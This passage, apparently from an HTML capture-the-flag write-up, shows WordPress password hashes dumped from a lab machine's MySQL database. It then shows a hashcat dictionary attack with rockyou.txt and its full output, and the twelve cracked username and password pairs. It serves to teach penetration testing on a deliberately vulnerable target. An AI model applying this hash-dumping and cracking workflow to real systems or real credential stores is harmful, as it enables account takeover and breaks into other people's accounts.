+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;garry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;harry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;scott&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;kathy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;tim&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ZOE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Dave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$Bl7</span><span style="color:#ff9d00;font-weight:700">/</span>V9Lqvu37jJT.6t4KWmY.v907Hy.&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Simon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BLxdiNNRP008kOQ</span>.jE44CjSK<span style="color:#ff9d00;font-weight:700">/</span>7tEcz0&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Abby&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$ByZg5mTBpKiLZ5KxhhRe</span><span style="color:#ff9d00;font-weight:700">/</span>uqR.48ofs.&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Vicki&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Pam&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +------------+------------------------------------+<br>
+                16&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.01&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[wordpress]&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        There's a hashed form of peter's password here..<br>
+        I copy/pasted and cleaned the list to make a file containing only the hashes called wordpress.hash<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">$P$B7889EMq</span><span style="color:#ff9d00;font-weight:700">/</span>erHIuZapMB8GEizebcIy9.<br>
+                <span style="color:#7f0044;font-weight:400">$P$BlumbJRRBit7y50Y17</span>.UPJ<span style="color:#ff9d00;font-weight:700">/</span>xEgv4my0<br>
+                <span style="color:#7f0044;font-weight:400">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span><br>
+                <span style="color:#7f0044;font-weight:400">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span><br>
+                <span style="color:#7f0044;font-weight:400">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10<br>
+                <span style="color:#7f0044;font-weight:400">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1<br>
+                <span style="color:#7f0044;font-weight:400">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0<br>
+                <span style="color:#7f0044;font-weight:400">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span><br>
+                <span style="color:#7f0044;font-weight:400">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0<br>
+                <span style="color:#7f0044;font-weight:400">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0<br>
+                <span style="color:#7f0044;font-weight:400">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1<br>
+                <span style="color:#7f0044;font-weight:400">$P$Bl7</span><span style="color:#ff9d00;font-weight:700">/</span>V9Lqvu37jJT.6t4KWmY.v907Hy.<br>
+                <span style="color:#7f0044;font-weight:400">$P$BLxdiNNRP008kOQ</span>.jE44CjSK<span style="color:#ff9d00;font-weight:700">/</span>7tEcz0<br>
+                <span style="color:#7f0044;font-weight:400">$P$ByZg5mTBpKiLZ5KxhhRe</span><span style="color:#ff9d00;font-weight:700">/</span>uqR.48ofs.<br>
+                <span style="color:#7f0044;font-weight:400">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span><br>
+                <span style="color:#7f0044;font-weight:400">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span>
+            </div>
+        </div><br>
+        <br>
+        I ran hashcat on my host OS to crack the hashes so I could make use of my gpu (speedy) and because i find <code>john</code> unfriendly to use<br>
+            <div class="codebox">
+                D<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\t</span>ictalec<span style="color:#333333;font-weight:400">\D</span>ownloads<span style="color:#333333;font-weight:400">\h</span>ashcat-5.1.<span style="color:#ff9d00;font-weight:700">0&gt;</span>hashcat64.exe&nbsp;-a&nbsp;0&nbsp;-m&nbsp;400&nbsp;-o&nbsp;wordpressCrack.txt&nbsp;wordpress.hash&nbsp;rockyou.txt<br>
+                hashcat&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>v5.1.0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;starting...<br>
+                <br>
+                *&nbsp;Device&nbsp;<span style="color:#0088ff;font-weight:400">#1:&nbsp;WARNING!&nbsp;Kernel&nbsp;exec&nbsp;timeout&nbsp;is&nbsp;not&nbsp;disabled.</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;may&nbsp;cause&nbsp;<span style="color:#3ad900;font-weight:400">"CL_OUT_OF_RESOURCES"</span>&nbsp;or&nbsp;related&nbsp;errors.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To&nbsp;disable&nbsp;the&nbsp;timeout,&nbsp;see<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>hashcat.net<span style="color:#ff9d00;font-weight:700">/</span>q<span style="color:#ff9d00;font-weight:700">/</span>timeoutpatch<br>
+                OpenCL&nbsp;Platform&nbsp;<span style="color:#0088ff;font-weight:400">#1:&nbsp;NVIDIA&nbsp;Corporation</span><br>
+                ======================================<br>
+                *&nbsp;Device&nbsp;<span style="color:#0088ff;font-weight:400">#1:&nbsp;GeForce&nbsp;GTX&nbsp;1060&nbsp;6GB,&nbsp;1536/6144&nbsp;MB&nbsp;allocatable,&nbsp;10MCU</span><br>
+                <br>
+                Hashes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;16&nbsp;digests<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;16&nbsp;unique&nbsp;digests,&nbsp;16&nbsp;unique&nbsp;salts<br>
+                Bitmaps<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;16&nbsp;bits,&nbsp;65536&nbsp;entries,&nbsp;0x0000ffff&nbsp;mask,&nbsp;262144&nbsp;bytes,&nbsp;5<span style="color:#ff9d00;font-weight:700">/</span>13&nbsp;rotates<br>
+                Rules<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1<br>
+                <br>
+                Applicable&nbsp;optimizers<span style="color:#ff9d00;font-weight:700">:</span><br>
+                *&nbsp;Zero-Byte<br>
+                <br>
+                Minimum&nbsp;password&nbsp;length&nbsp;supported&nbsp;by&nbsp;kernel<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0<br>
+                Maximum&nbsp;password&nbsp;length&nbsp;supported&nbsp;by&nbsp;kernel<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;256<br>
+                <br>
+                ATTENTION<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;Pure&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>unoptimized<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;OpenCL&nbsp;kernels&nbsp;selected.<br>
+                This&nbsp;enables&nbsp;cracking&nbsp;passwords&nbsp;and&nbsp;salts&nbsp;&gt;&nbsp;length&nbsp;32&nbsp;but&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">the</span>&nbsp;price&nbsp;of&nbsp;drastically&nbsp;reduced&nbsp;performance.<br>
+                If&nbsp;you&nbsp;want&nbsp;to&nbsp;switch&nbsp;to&nbsp;optimized&nbsp;OpenCL&nbsp;kernels,&nbsp;append&nbsp;-O&nbsp;to&nbsp;your&nbsp;commandline.<br>
+                <br>
+                Watchdog:&nbsp;Temperature&nbsp;abort&nbsp;trigger&nbsp;set&nbsp;to&nbsp;90c<br>
+                <br>
+                Dictionary&nbsp;cache&nbsp;hit:<br>
+                *&nbsp;Filename..:&nbsp;rockyou.txt<br>
+                *&nbsp;Passwords.:&nbsp;14344384<br>
+                *&nbsp;Bytes.....:&nbsp;139921497<br>
+                *&nbsp;Keyspace..:&nbsp;14344384<br>
+                <br>
+                Cracking&nbsp;performance&nbsp;lower&nbsp;than&nbsp;expected?<br>
+                <br>
+                *&nbsp;Append&nbsp;-O&nbsp;to&nbsp;the&nbsp;commandline.<br>
+                &nbsp;&nbsp;This&nbsp;lowers&nbsp;the&nbsp;maximum&nbsp;supported&nbsp;password-&nbsp;and&nbsp;salt-length&nbsp;(typically&nbsp;down&nbsp;to&nbsp;32).<br>
+                <br>
+                *&nbsp;Append&nbsp;-w&nbsp;3&nbsp;to&nbsp;the&nbsp;commandline.<br>
+                &nbsp;&nbsp;This&nbsp;can&nbsp;cause&nbsp;your&nbsp;screen&nbsp;to&nbsp;lag.<br>
+                <br>
+                *&nbsp;Update&nbsp;your&nbsp;OpenCL&nbsp;runtime&nbsp;/&nbsp;driver&nbsp;the&nbsp;right&nbsp;way:<br>
+                &nbsp;&nbsp;https://hashcat.net/faq/wrongdriver<br>
+                <br>
+                *&nbsp;Create&nbsp;more&nbsp;work&nbsp;items&nbsp;to&nbsp;make&nbsp;use&nbsp;of&nbsp;your&nbsp;parallelization&nbsp;power:<br>
+                &nbsp;&nbsp;https://hashcat.net/faq/morework<br>
+                <br>
+                Approaching&nbsp;final&nbsp;keyspace&nbsp;-&nbsp;workload&nbsp;adjusted.<br>
+                <br>
+                <br>
+                Session..........:&nbsp;hashcat<br>
+                Status...........:&nbsp;Exhausted<br>
+                Hash.Type........:&nbsp;phpass,&nbsp;WordPress&nbsp;(MD5),&nbsp;phpBB3&nbsp;(MD5),&nbsp;Joomla&nbsp;(MD5)<br>
+                Hash.Target......:&nbsp;wordpress.hash<br>
+                Time.Started.....:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;14:51:02&nbsp;2019&nbsp;(1&nbsp;min,&nbsp;33&nbsp;secs)<br>
+                Time.Estimated...:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;14:52:35&nbsp;2019&nbsp;(0&nbsp;secs)<br>
+                Guess.Base.......:&nbsp;File&nbsp;(rockyou.txt)<br>
+                Guess.Queue......:&nbsp;1/1&nbsp;(100.00%)<br>
+                Speed.#1.........:&nbsp;&nbsp;&nbsp;767.2&nbsp;kH/s&nbsp;(5.51ms)&nbsp;@&nbsp;Accel:512&nbsp;Loops:128&nbsp;Thr:64&nbsp;Vec:1<br>
+                Recovered........:&nbsp;12/16&nbsp;(75.00%)&nbsp;Digests,&nbsp;12/16&nbsp;(75.00%)&nbsp;Salts<br>
+                Progress.........:&nbsp;229510144/229510144&nbsp;(100.00%)<br>
+                Rejected.........:&nbsp;0/229510144&nbsp;(0.00%)<br>
+                Restore.Point....:&nbsp;14344384/14344384&nbsp;(100.00%)<br>
+                Restore.Sub.#1...:&nbsp;Salt:15&nbsp;Amplifier:0-1&nbsp;Iteration:8064-8192<br>
+                Candidates.#1....:&nbsp;$HEX[303334323137383439]&nbsp;-&gt;&nbsp;$HEX[042a0337c2a156616d6f732103]<br>
+                Hardware.Mon.#1..:&nbsp;Temp:&nbsp;70c&nbsp;Fan:&nbsp;48%&nbsp;Util:&nbsp;98%&nbsp;Core:1898MHz&nbsp;Mem:3802MHz&nbsp;Bus:16<br>
+                <br>
+                Started:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;14:50:58&nbsp;2019<br>
+                Stopped:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;14:52:36&nbsp;2019
+            </div>
+        </div><br>
+        <br>
+        Results! I matched the hashes to usernames by cross-checking the info from the original mysql table.<br>
+            <div class="codebox">
+                tim&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0<span style="color:#ff9d00;font-weight:700">:</span>thumb<br>
+                John&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$B7889EMq</span><span style="color:#ff9d00;font-weight:700">/</span>erHIuZapMB8GEizebcIy9.<span style="color:#ff9d00;font-weight:700">:</span>incorrect<br>
+                kathy&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0<span style="color:#ff9d00;font-weight:700">:</span>coolgirl<br>
+                gary&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1<span style="color:#ff9d00;font-weight:700">:</span>football<br>
+                barry&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span><span style="color:#ff9d00;font-weight:700">:</span>washere<br>
+                scott&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span><span style="color:#ff9d00;font-weight:700">:</span>cookie<br>
+                harry&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0<span style="color:#ff9d00;font-weight:700">:</span>monkey<br>
+                Pam&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span><span style="color:#ff9d00;font-weight:700">:</span>0520<br>
+                heather&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10<span style="color:#ff9d00;font-weight:700">:</span>passphrase<br>
+                Dave&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$Bl7</span><span style="color:#ff9d00;font-weight:700">/</span>V9Lqvu37jJT.6t4KWmY.v907Hy.<span style="color:#ff9d00;font-weight:700">:</span>damachine<br>
+                Elly&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$BlumbJRRBit7y50Y17</span>.UPJ<span style="color:#ff9d00;font-weight:700">/</span>xEgv4my0<span style="color:#ff9d00;font-weight:700">:</span>ylle<br>
+                ZOE&nbsp;-&nbsp;<span style="color:#7f0044;font-weight:400">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1<span style="color:#ff9d00;font-weight:700">:</span>partyqueen
+            </div>
+        </div><br>
+        <br>
+        But not peter's password, or any real use for any of these passwords :/<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>End</strong></h2><br>
+        That's it. There were other paths I went down that didn't quite qualify as rabbit holes, like <code>ps aux</code> and <code>pkexec</code> from the suid binaries. In the end, it seems like the thing that baffles you the most is the sheer amount information you collect and the process of sorting through it. The difficulty is finding the needle in your self-made haystack.<br>
+        <br>
+    </writeup>
+</section>
+
+</body>
+</html>
